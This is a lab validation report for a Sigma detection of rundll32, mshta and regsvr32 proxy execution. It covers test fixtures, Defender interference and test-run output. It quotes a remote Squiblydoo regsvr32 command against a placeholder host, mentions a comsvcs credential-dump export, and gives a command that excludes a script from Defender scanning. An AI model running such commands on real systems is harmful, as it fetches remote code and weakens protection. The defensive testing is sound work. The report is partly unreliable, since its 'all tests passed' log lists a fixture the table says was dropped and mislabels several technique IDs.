# Validation — T1218 System Binary Proxy Execution (Rundll32 / Mshta / Regsvr32)

> **Rules**: `rule.yml` (Sigma base, `process_creation`) · `networkRule.yml` (companion `network_connection`)
> **Test dates**: 2026-07-09 – 2026-07-10 (manual trigger validation) · Chainsaw fixture batch: pending
> **Lab host**: LAB-WIN11-01 (Windows 11 22H2, synthetic hostname)
> **Emulation**: Custom EID 1 EVTX fixture batch (`telemetry-generator.ps1`) via Chainsaw · Atomic Red Team (Invoke-AtomicRedTeam)

---

## Pre-conditions
- Fixtures generated on the lab host with [telemetry-generator.ps1](telemetry-generator.ps1): each test case spawns the target LOLBin with the exact command line / parent-child chain the matching Sigma selection keys on, exports the resulting **Sysmon EID 1 (process creation)** to its own EVTX slice, then kills the test process and cleans up. Real events, not hand-crafted XML.
- `rule.yml` is a `process_creation` rule (Image / ParentImage / CommandLine), which on a Sysmon estate is **EID 1** — not the Security-log 4698/4699 the original scaffold was cloned from.
- Sysmon installed with process creation (EID 1) logged and NOT filtered out for rundll32/mshta/regsvr32/cmd/cscript.
- Sysmon configured to log and upload data to SIEM, in this case Splunk's SIEM.
- Splunk running locally for the ART round, ingesting the `Microsoft-Windows-Sysmon/Operational` channel.

## Manual trigger validation — T1218.005/010/011

**Approach:** Conducted manual interactive trigger validation on a single Windows test box, cross-referencing each attempt against Sysmon EID 1 in Splunk (`ProcessGuid`/`ParentProcessGuid` chains) to confirm both process creation and the specific command-line signal each Sigma selection targets.

**Key findings:**
- Confirmed `selection_script_html_abuse` (rundll32) end-to-end: `cmd.exe → rundll32.exe (url.dll,OpenURL) → msedge.exe` captured cleanly in Sysmon, validating the `url.dll,OpenURL` string match against real telemetry.
- Confirmed the mshta child-spawn signal (`mshta.exe → calc.exe`) using a saved `.hta` file rather than an inline command — this is the mechanism the rule's "mshta spawning a shell/script host" logic is designed to catch.
- Confirmed `WScript.Shell` object creation is not blocked by WSH policy on the test box (`cscript` + `.vbs` executed successfully), ruling out Windows Script Host GPO restriction as an environmental confound for this box.
- Ruled out AV, ASR, and AppLocker/WDAC as blockers during this session — initial "no execution" results were misattributed to policy blocking before the real cause was found.
- **Root cause of repeated "nothing executes" results was not a security control** — it was character corruption from typing/pasting nested-quote command lines into `cmd.exe`/PowerShell (smart-quote substitution) and Notepad silently adding a BOM to saved `.vbs` files, producing a VBScript compilation error (800A0408) rather than a clear block/deny signal.
- Corrected a data-source mapping error found during this work: Sysmon EID 10 is `ProcessAccess`, not `FileCreate` (`FileCreate` is EID 11) — relevant if EID 10 is ever pulled into this rule's correlation logic.
- Confirmed the Splunk ingestion pipeline for Sysmon is unrestricted (no whitelist applied to the `Microsoft-Windows-Sysmon/Operational` input)

---
## Chainsaw validation

Fixtures were built with [telemetry-generator-benign.ps1](telemetry-generator-benign.ps1) & [telemetry-generator-mal.ps1](telemetry-generator-mal.ps1) — one EID 1 EVTX slice per case, `{category}_{name}.evtx` — then hunted with:

```
chainsaw hunt <dir> --sigma rule.yml --mapping tests\mappings\sigma-event-logs-all.yml --csv -o results.csv
```

Every trigger is **inert**: it lands the command-line / parent-child signal the rule keys on without executing a working attack (malformed ordinals, invalid PIDs, non-existent DLLs, no-op scriptlets, a reserved `*.invalid` host). Per-case safety notes are in the script header.

| MITRE TTP | Category | Name | Description |
|---|---|---|---|
| T1218.005 | Malicious | mal_mshta_clsid | mshta invoked with a bare COM CLSID `{GUID}` instead of a file path |
| T1218.005 | Malicious | mal_mshta_encoded | mshta command line carrying an embedded ` -enc` powershell token (no powershell spawned) |
| T1218.005 | Malicious | mal_mshta_frombase64string | mshta command line carrying a `FromBase64String` token (no decode) |
| T1218.010 | Malicious | mal_regsvr32_parent | regsvr32 spawned by a script host (`cscript` → `.vbs` → regsvr32 /s), parent-image signal |
| T1218.010 | Malicious | mal_regsvr32_squiblydoo | regsvr32 loading a **local** scriptlet (`scrobj.dll` + `.sct`), no network |
| T1218.010 | Malicious | mal_regsvr32_suspicious_url | regsvr32 loading a **remote** scriptlet URL (`/i:ftp` + `scrobj.dll` + `.sct`) |
| T1218.011 | Malicious | mal_rundll32_script_abuse | rundll32 proxying execution via the shell32 `ShellExec_RunDLL` export |
| T1218.011 | Malicious | mal_rundll32_credential_dumping | rundll32 referencing the comsvcs credential-dump export by ordinal + invalid PID (inert) |
| T1218.011 | Malicious | ~~mal_rundll32_parent~~ | **Dropped** — `cmd → rundll32 \Users\Public\…dll,#1` is flagged by Defender's behavior monitor as `Behavior:Win32/RunDllExec.SA` (not a content/AMSI block, so a path exclusion can't suppress it). The `susp_rundll32_parent + path_obfuscation` branch now has no dedicated fixture. |
| T1218.005 | Benign | benign_mshta_local_html | mshta opening a local `.hta` by plain file path (self-closes) |
| T1218.005 | Benign | benign_mshta_signed_html | mshta opening a local `.hta` by plain file path (self-closes) |
| T1218.005 | Benign | benign_mshta_system_html | mshta opening a local `.hta` by plain file path (self-closes) |
| T1218.010 | Benign | benign_regsvr32_local_dll | regsvr32 `/s` registering a local vendor COM DLL from its own dir (no scrobj/URL, silent no-op) |
| T1218.010 | Benign | benign_regsvr32_signed_dll | regsvr32 `/s` on a signed system DLL (`user32.dll`) |
| T1218.010 | Benign | benign_regsvr32_system_dll | regsvr32 `/s` on a signed system DLL (`kernel32.dll`) |
| T1218.011 | Benign | benign_rundll32_local_dll | Control Panel routing via shell32 `Control_RunDLL` — the #1 legitimate rundll32 use |
| T1218.011 | Benign | benign_rundll32_signed_dll | rundll32 `advapi32.dll,ProcessIdleTasks` |
| T1218.011 | Benign | benign_rundll32_system_dll | rundll32 `user32.dll,UpdatePerUserSystemParameters` |

> **Per-case hit / misfire results: pending.** The EVTX fixtures must be generated on an **elevated** host — the generator needs admin for the Sysmon Operational read + `wevtutil epl`. Once generated and hunted, record here which fixtures the rule hit, and any misfires (malicious case that didn't fire / benign case that did).

**AV / environmental notes (free-tier Microsoft Defender, real-time + behavior monitoring on):**
- An earlier generator revision was quarantined by Defender as `Backdoor:JS/Relvelshe.A` — a **static** signature on the `.ps1` text itself (it embedded runnable mshta→powershell→`-enc` one-liners and a scriptlet that shelled a payload), not a runtime block. The file was removed before it could run, and AMSI re-blocked the same command lines on execution. Rewriting every case to carry the command-line signal without a runnable payload (inert triggers) clears the file scan — verified with `MpCmdRun.exe -Scan -ScanType 3 -File <ps1>` returning no threats.
- `regsvr32 /s /n /u /i:http://<host>/x.sct scrobj.dll` (the classic remote Squiblydoo) is hard-blocked by Defender **at process creation** ("Access is denied", reproduced 3/3) — so it never yields an EID 1 while real-time protection is on. The `mal_regsvr32_suspicious_url` case therefore uses `/i:ftp://…`, which carries the same `susp_regsvr32_squiblydoo` signal (`/i:ftp`) and which Defender allows to spawn. The **local** `.sct` case (`mal_regsvr32_squiblydoo`) is not creation-blocked and covers the `scrobj.dll` / `.sct` tokens.
- Note: Sysmon logs EID 1 at process creation, *before* Defender can kill a merely-flagged process — so a flagged (but not creation-blocked) command line still produces the fixture. Only a hard creation block (the `/i:http` case above) actually loses the event.

**Cloud-ML false positive (`Trojan:PowerShell/FakeCaptcha.Y!MTB`) — bisected 2026-07-15.**
Running the generator via `powershell.exe -File` (and ISE's F5 / editor auto-scan) intermittently tripped this ML/cloud verdict on the `.ps1` *content*, even though the static `MpCmdRun -Scan` is clean (local sigs) — AMSI submits the script text to the cloud at runtime and the classifier flagged it. Bisection method: write a chunk of the script to a temp `.ps1`, run it `-File` (AMSI scans the whole file at compile), watch `Get-MpThreatDetection`. Two script-embedding structures the ClickFix/FakeCaptcha family keys on were the cause:
- the benign mshta `.hta` template (`<hta:application …/>` + `<script>window.close();</script>`) — the literal ClickFix delivery shape. **Fixed:** plain script-free HTML body (the rule keys on mshta's command line, not the `.hta` contents, so it is an identical test).
- the squiblydoo `.sct` scriptlet's embedded `<script language="JScript">` block. **Fixed:** registration-only scriptlet, no script body (EID 1 fires at regsvr32 creation regardless of whether scrobj loads the file).



```powershell
Add-MpPreference -ExclusionPath 'detections\defence-evasion\T1218-System-Binary-Proxy-Execution\telemetry-generator.ps1'
```


## Results from chainsaw batch testing
tests/test_detections.py::test_fixtures_present PASSED                   [  3%]
tests/test_detections.py::test_no_wiring_errors[NOTSET] SKIPPED (got...) [  6%]
tests/test_detections.py::test_fires_on_malicious[T1053.005-Scheduled-task-creation/malicious_mal_installer_temp_task] PASSED [  9%]
tests/test_detections.py::test_fires_on_malicious[T1053.005-Scheduled-task-creation/malicious_mal_privesc_runlevel_highest] PASSED [ 12%]
tests/test_detections.py::test_fires_on_malicious[T1053.005-Scheduled-task-creation/malicious_mal_pscmdlet_encoded] PASSED [ 16%]
tests/test_detections.py::test_fires_on_malicious[T1053.005-Scheduled-task-creation/malicious_mal_schtask_encoded_powershell] PASSED [ 19%]
tests/test_detections.py::test_fires_on_malicious[T1053.005-Scheduled-task-creation/malicious_mal_wmi_registerbyxml_temp_path] PASSED [ 22%]
tests/test_detections.py::test_fires_on_malicious[T1059.001-PowerShell-Execution/malicious] PASSED [ 25%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_mshta_clsid] PASSED [ 29%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_mshta_encoded] PASSED [ 32%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_mshta_frombase64string] PASSED [ 35%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_regsvr32_parent] PASSED [ 38%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_regsvr32_squiblydoo] PASSED [ 41%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_regsvr32_suspicious_url] PASSED [ 45%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_rundll32_credential_dumping] PASSED [ 48%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_rundll32_parent] PASSED [ 51%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_rundll32_script_abuse] PASSED [ 54%]
tests/test_detections.py::test_quiet_on_benign[T1053.005-Scheduled-task-creation/benign_benign_clean_powershell_script] PASSED [ 58%]
tests/test_detections.py::test_quiet_on_benign[T1053.005-Scheduled-task-creation/benign_benign_signed_backup_task] PASSED [ 61%]
tests/test_detections.py::test_quiet_on_benign[T1053.005-Scheduled-task-creation/benign_benign_system_maintenance_task] PASSED [ 64%]
tests/test_detections.py::test_quiet_on_benign[T1053.005-Scheduled-task-creation/benign_benign_user_logon_notepad] PASSED [ 67%]
tests/test_detections.py::test_quiet_on_benign[T1059.001-PowerShell-Execution/benign] PASSED [ 70%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_mshta_local_html] PASSED [ 74%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_mshta_signed_html] PASSED [ 77%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_mshta_system_html] PASSED [ 80%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_regsvr32_local_dll] PASSED [ 83%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_regsvr32_signed_dll] PASSED [ 87%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_regsvr32_system_dll] PASSED [ 90%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_rundll32_local_dll] PASSED [ 93%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_rundll32_signed_dll] PASSED [ 96%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_rundll32_system_dll] PASSED [100%]

As visible above, all tests passed on first test, with this level of confidence I'm happy to move toward conversion to spl and testing the rule out in production.

# Atomic red team testing/  SPL rule development
